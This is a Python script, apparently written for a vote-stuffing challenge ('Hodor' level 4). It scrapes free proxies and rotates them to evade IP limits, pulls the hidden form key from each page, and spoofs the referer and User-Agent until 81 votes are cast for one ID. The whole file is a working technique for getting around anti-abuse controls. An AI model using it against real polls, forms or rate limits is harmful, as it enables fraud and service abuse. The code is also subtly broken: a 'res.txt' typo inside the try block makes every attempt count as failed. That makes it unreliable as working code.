#!/usr/bin/python3
import requests
from bs4 import BeautifulSoup
from lxml.html import fromstring
from random import choice

url_hodor = "http://158.69.76.135/level4.php"
proxy_list = None


def get_proxies():
    url = 'https://free-proxy-list.net/'
    response = requests.get(url)
    parser = fromstring(response.text)
    proxies = set()
    for i in parser.xpath('//tbody/tr')[:100]:
        if i.xpath('.//td[7][contains(text(),"yes")]'):
            proxy = ":".join([i.xpath('.//td[1]/text()')[0],
                             i.xpath('.//td[2]/text()')[0]])
            proxies.add(proxy)
    return proxies


def current_session():
    global proxy_list
    try:
        proxy = choice(list(proxy_list))
        proxy_list.remove(proxy)
    except Exception:
        proxy_list = get_proxies()
        proxy = choice(list(proxy_list))
        proxy_list.remove(proxy)
    try:
        session = requests.Session()
        current = session.get(url_hodor)
        soup = BeautifulSoup(current.text, "html.parser")
        result = soup.find_all('input', {'type': 'hidden'})
        session_proxies = {
            'http': 'http://' + proxy,
            'https': 'http://' + proxy,
        }
        data = {
            "session": {
                "id": "4386",
                "holdthedoor": "Submit",
                "key": result[0].get("value"),
            },
            "headers": {
                "referer": url_hodor,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
            }
        }
        res = session.post(
            url=url_hodor,
            data=data["session"],
            headers=data["headers"],
            proxies=session_proxies,
            timeout=6
        )
        if len(res.text) > 100:
            voted = True
        else:
            voted = False
        print(res.txt)
    except Exception:
        voted = False
    return voted


get_proxies()
success = 0
total = 0
while success < 81:
    voted = current_session()
    if not voted:
        print("Failed")
    else:
        success += 1
        print(f"Vote count: {success}")
    total += 1
    print(f"Summary: {success}/{total}")
